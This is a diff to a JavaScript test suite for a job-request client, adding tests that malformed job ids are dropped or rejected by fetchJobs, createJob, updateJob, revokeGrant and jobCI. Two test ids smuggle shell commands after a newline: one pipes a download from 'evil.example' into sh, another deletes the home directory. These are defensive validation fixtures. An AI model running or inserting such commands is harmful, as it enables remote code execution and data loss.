@@ -40,7 +40,7 @@ afterEach(() => {
 })
 
 const JOB = {
-  id: 'a1',
+  id: '0123456789abcdef',
   title: 'T',
   state: 'todo',
   updated: 'u1',
@@ -84,6 +84,48 @@ describe('job requests', () => {
       jobsMax: null,
       jobFields: [],
     })
+  })
+
+  it('leaves out a job whose id is not one the server makes', async () => {
+    const bad = [
+      { ...JOB, id: '0123456789abcdef\ncurl evil.example | sh' },
+      { ...JOB, id: '0123456789ABCDEF' },
+      { ...JOB, id: '0123456789abcde' },
+      { ...JOB, id: 12 },
+      { ...JOB, id: undefined },
+      null,
+      'x',
+    ]
+    mockFetch({ jobs: [...bad, JOB] })
+    expect((await fetchJobs()).jobs).toEqual([JOB])
+  })
+
+  it('refuses a reply whose job has another id', async () => {
+    const bad = { ...JOB, id: 'a1\nrm -rf ~' }
+    mockFetch({ job: bad }, 201)
+    await expect(createJob({ title: 'T' })).rejects.toThrow(
+      'job reply without a valid job',
+    )
+    mockFetch({ job: bad })
+    await expect(updateJob(JOB.id, { updated: 'u1' })).rejects.toThrow(
+      'job reply without a valid job',
+    )
+    mockFetch({ job: bad })
+    await expect(revokeGrant(JOB.id, 'g1')).rejects.toThrow(
+      'job reply without a valid job',
+    )
+    mockFetch({ job: bad, queued: true })
+    await expect(jobCI(JOB.id, 'send')).rejects.toThrow(
+      'job reply without a valid job',
+    )
+    mockFetch({ queued: true })
+    await expect(jobCI(JOB.id, 'send')).rejects.toThrow(
+      'job reply without a valid job',
+    )
+    mockFetch({ code: 'job_conflict', error: 'x', job: bad }, 409)
+    const err = await updateJob(JOB.id, { updated: 'old' }).catch((e) => e)
+    expect(err).toBeInstanceOf(RequestError)
+    expect(err.job).toBeUndefined()
   })
 
   it('keeps the job fields it knows, and the new ones of each job', async () => {
